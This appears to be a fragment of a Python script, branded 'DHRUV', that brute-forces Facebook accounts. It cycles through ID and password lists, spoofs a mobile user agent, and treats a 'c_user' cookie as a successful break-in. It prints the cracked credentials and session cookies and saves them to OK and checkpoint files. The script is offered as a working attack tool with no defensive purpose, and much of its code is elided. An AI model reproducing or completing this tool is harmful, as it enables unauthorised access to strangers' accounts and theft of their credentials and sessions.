...
\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mDHRUV-RAJPOOT
...
def c():
	...
	if ok =='1':
		...
		os.system("xdg-open https://wa.me/+923187061605");Main()
    ...
    def api(self, uid, pwx):
        ...
        for pw in pwx:
            ...
            if "www.facebook.com" in response.json()["error_msg"]:
                ...
                print("\r \033[0;92m[DHRUV-OK] %s √ %s\033[0;97m         " % (uid, pw))
...
def rcrack1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				print('\33[1;92m[DHRUV-OK] '+uid+' √ '+ps+'\33[0;97m')

				print('%s[%sCOOKIE%s] : %s%s ' % (W,Y,W,G,coki))

				

				open('DHRUV-OK.txt', 'a').write(uid+' √ '+ps+'\n')
				...
				print('\33[1;91m[DHRUV-CP] '+uid+' • '+ps+'\33[0;97m')

				open('DHRUV-CP.txt', 'a').write(uid+' • '+ps+'\n')
...
def file():
		...
		print("\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/MANI.txt");linex()
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write(f'\r\r\033[1;37m[M•A•N•I] %s <•> OK:- \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m[DHRUV-OK] %s √ %s'%(ids,pas))
                                ...
                                if 'y' in cp:
                                        ...
                                        print(f'\r\r\033[1;37m[DHRUV-CP] '+ids+' • '+pas+'\033[1;97m')
